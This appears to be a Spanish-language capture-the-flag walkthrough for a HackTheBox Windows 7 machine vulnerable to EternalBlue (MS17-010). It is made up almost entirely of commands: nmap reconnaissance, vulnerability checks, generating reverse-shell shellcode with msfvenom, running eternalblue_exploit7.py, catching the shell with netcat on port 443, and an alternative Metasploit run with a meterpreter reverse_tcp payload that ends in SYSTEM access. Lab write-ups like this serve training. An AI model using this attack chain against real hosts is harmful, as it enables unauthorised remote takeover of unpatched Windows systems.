## Summary

Tags: #Windows #EternalBlue 

- IP -> 10.10.10.40
- Ports -> TCP (135, 139, 445, 49152 ... 49157), UDP (idk)
- OS ->  Windows 
- Services & Applications
    - 445 -> Windows 7 Proffesional 7601 Service Pack 1 
    -  -> 


## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

## Recon

```bash
❯ ping -c 1 10.10.10.40                         # Para saber si la maquina esta activa o no (ttl=64 Linux, ttl=128 Windows)

	# IP = IP Address de la maquina target 
	# c = Numero de pings a ejecutar
```

```bash 
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ❮Target IP❯  -oG allPorts       # Escaneo en la Capa 4 del modelo OSI

❯ nmap -sCV -p22,... ❮Target IP❯ -oN targeted

	#  p22,... = Indica los puertos que se quieren escanear
	#  sC = Lanza scripts básicos de enumeración
	#  sV = Enumera la versión y servicio que está corriendo en los puertos
	#  Target IP = Dirección IP que se quiere escanear
	#  oN targeted = Exporta el output a un fichero en formato nmap con nombre “targeted”
```

Para saber si es vulnerable al Eternal Blue
```bash 
❯ nmap -sV -p445 --script=smb-vuln-ms17-010 ❮Target IP❯             # Para ver si es vulnerable al EternalBlue

❯ nmap --script "vuln and safe" -p445 ❮Target IP❯ -oN smbVulnScan   # Para ver si este servicio es vulnerable al EternalBlue (ms17-010) en Windows 7.

	#  p445 = Indica el puerto que se quiere escanear
	#  Target IP = Dirección IP que se quiere escanear
	#  oN smbVulnScan = Exporta el output a un fichero en formato nmap con nombre “smbVulnScan”
	#  vuln and safe = Detecta vulnerabilidades de forma segura, sin experimentar un DoS
```

Descargamos el exploit del EternalBlue de la siguiente pagina:
```python
❯ python2.7 eternal_checker.py 10.10.10.40              # Debemos de ver que alguno de los resultados nos ponga 'Done' y que no esta parchado
```

Ahora nos vamos al dir 'ShellCode' y ejecutamos lo siguiente:
```shell
❯ ./shell_prep.sh               # Ejecutamos el binario para ir preparando los archvios 'Msfvenom'

	# Y                        # Generar una ReverShell
	# 10.10.14.22              # Colocamos nuestra IP LHOST
	# 443                      # El puerto de escucha de nuestra maquina para x64 y x86
	# 1                        # Generar una Shell regular 
	# 1                        # Usar un Stageless payload
```

Una vez obtenido los archivos, hacemos lo siguiente:
```python 
❯ chmod +x eternalblue_exploit7.py     # Le damos permisos de ejecucion

❯ python2.7 eternalblue_exploit7.py 10.10.10.40 ./shellcode/sc_x64.bin

	# exploit7 = Windows 7
	# IP = Maquina victima 
	# Path = Donde se encuentra el archivo sc_x64.bin
```

```bash 
❯ rlwrap nc -nlvp 443           # Nos ponemos en escucha por el puerto 443
```

Ejecutamos el comando anterior y obtenemos la consola como nt authority/system

## Usando Metasploit 

Saber la versión de Windows y si es vulnerable al eternalblue
```bash 
# Para ver si el Windows en vulnerable al EternalBlue
❯ msfconsole -q                                    # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/smb/smb_ms17_010      # Usamos el auxiliar
	❯ options
	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
	❯ run 
```

```bash 
# Usaremos el EternalBlue SMBv1
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use exploit/windows/smb/ms17_010_eternalblue      # Usamos el exploit
	❯ options
	❯ set payload windows/x64/meterpreter/reverse_tcp
	❯ set LHOST 192.168.1.157                          # Colocamos la IP de nuestra maquina 
	❯ set RHOSTS 192.168.1.194                         # Colocamos la IP de la maquina victima
	❯ exploit 


# Ahora somos NT Authority\System
```

